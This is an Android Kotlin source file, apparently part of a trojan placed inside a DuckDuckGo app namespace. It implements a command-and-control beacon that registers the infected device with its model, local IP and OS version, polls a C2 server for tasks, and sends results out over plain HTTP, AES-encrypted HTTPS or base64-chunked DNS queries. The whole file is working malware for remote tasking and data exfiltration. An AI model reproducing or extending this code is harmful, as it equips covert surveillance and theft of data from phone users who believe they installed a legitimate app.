package com.duckduckgo.trojan.impl

import android.annotation.SuppressLint
import android.os.Build

import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.api.BeaconService
import com.duckduckgo.trojan.api.CheckInResult
import com.duckduckgo.trojan.api.PendingCommand
import com.duckduckgo.trojan.impl.di.C2NetworkModule
import com.squareup.anvil.annotations.ContributesBinding
import dagger.SingleInstanceIn
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.Inet4Address
import java.net.NetworkInterface
import javax.inject.Inject

/**
 * Real implementation of [BeaconService].
 *
 * Check-in flow (always HTTP):
 *   1. POST /beacon/check-in  → register device, get server config
 *   2. GET  /beacon/tasks/{deviceName} → poll for pending tasks
 *
 * Exfiltration (sendResult) is protocol-aware:
 *   "http"  → plain JSON POST to /beacon/result
 *   "https" → AES-256-CBC encrypted payload POST to /beacon/result
 *   "dns"   → base64-chunked DNS A-queries to the C2 DNS listener
 */
@SingleInstanceIn(AppScope::class)
@ContributesBinding(AppScope::class)
class RealBeaconService @Inject constructor(
    private val c2Api: C2ApiService,
) : BeaconService {

    override suspend fun checkIn(): CheckInResult {
        val checkInRequest = CheckInRequest(
            device_name = getDeviceName(),
            ip_address = getLocalIpAddress(),
            os_info = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})",
        )
        val checkInResponse = c2Api.checkIn(checkInRequest)
        val tasksResponse = c2Api.getTasks(getDeviceName())

        val commands = tasksResponse.tasks.map { task ->
            PendingCommand(
                id = task.task_id,
                type = task.task_type,
                payload = task.parameters,
            )
        }

        return CheckInResult(
            commands = commands,
            beaconInterval = checkInResponse.beacon_interval,
            communicationProtocol = checkInResponse.communication_protocol,
        )
    }

    override suspend fun sendResult(
        commandId: String,
        commandType: String,
        result: String,
        protocol: String,
    ) {
        when (protocol) {
            "https" -> sendResultAes(commandId, commandType, result)
            "dns" -> withContext(Dispatchers.IO) {
                DnsExfiltrator().exfiltrate(commandId, getDeviceName(), result)
            }
            else -> sendResultHttp(commandId, commandType, result)
        }
    }

    private suspend fun sendResultHttp(commandId: String, commandType: String, result: String) {
        c2Api.sendResult(
            TaskResultRequest(
                task_id = commandId,
                task_type = commandType,
                device_name = getDeviceName(),
                success = true,
                data = mapOf("output" to result),
            ),
        )
    }

    private suspend fun sendResultAes(commandId: String, commandType: String, result: String) {
        val encrypted = AesExfiltrator.encrypt(result)
        c2Api.sendResult(
            TaskResultRequest(
                task_id = commandId,
                task_type = commandType,
                device_name = getDeviceName(),
                success = true,
                data = mapOf("output" to encrypted),
                encrypted = true,
            ),
        )
    }

    @SuppressLint("HardwareIds")
    private fun getDeviceName(): String =
        (Build.MODEL ?: "unknown_device").replace(" ", "_")

    private fun getLocalIpAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces()
                ?.toList()
                ?.flatMap { it.inetAddresses.toList() }
                ?.firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
                ?.hostAddress ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }
}
